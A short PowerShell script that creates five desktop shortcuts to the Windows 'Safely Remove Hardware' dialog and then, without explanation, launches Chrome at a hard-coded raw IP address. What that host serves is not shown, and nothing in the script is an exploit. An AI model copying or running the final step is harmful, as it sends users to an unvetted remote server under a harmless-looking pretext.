for ($i = 1; $i -le 5; $i++) 
{
    $num = Get-Random
    $AppLocation = "C:\Windows\System32\rundll32.exe"
    $WshShell = New-Object -ComObject WScript.Shell
    
    $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware " + $num + ".lnk")
    $Shortcut.TargetPath = $AppLocation
    $Shortcut.Arguments = "shell32.dll,Control_RunDLL hotplug.dll"
    $Shortcut.IconLocation = "hotplug.dll,0"
    $Shortcut.Description = "Device Removal"
    $Shortcut.WorkingDirectory = "C:\Windows\System32"
    
    $Shortcut.Save()

    # Pause execution for 3 seconds
    Write-Host "Shortcut $i created. Waiting 3 seconds..." -ForegroundColor Yellow
    Start-Sleep -Seconds 3
}

Write-Host "Done! 5 shortcuts created." -ForegroundColor Green

Start-Sleep -Seconds 5

Start-Process "chrome.exe" "https://102.211.234.105/"